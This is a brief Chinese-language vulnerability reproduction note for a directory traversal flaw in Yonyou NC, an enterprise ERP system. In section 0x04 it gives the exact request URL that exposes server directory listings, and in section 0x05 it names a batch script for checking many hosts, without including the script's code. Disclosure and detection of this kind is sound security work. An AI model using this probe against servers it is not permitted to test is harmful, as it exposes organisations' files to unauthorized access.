# 0x00 软件介绍
用友NC：用友NC是面向集团的ERP类软件  
官网：https://www.yonyou.com/

# 0x01 复现环境
复现环境：内网环境  
复现版本：None  
环境搭建：  
无

# 0x02 利用条件
无

# 0x03 影响版本
暂无

# 0x04 漏洞复现
访问如下地址
```
http://x.x.x.x/NCFindWeb?service=IPreAlertConfigService&filename
```
返回如下图，表示存在目录遍历漏洞  
![image](./pic/0.png)

# 0x05 批量脚本
用友NC-FileRead-Vuln-Batch-Detect.py，具体用法见：python3 用友NC-FileRead-Vuln-Batch-Detect.py -h  
效果如下  
![image](./pic/1.png)

# 0x06 参考链接
https://mp.weixin.qq.com/s/QqlueerhP0uVWWJNULhGvw
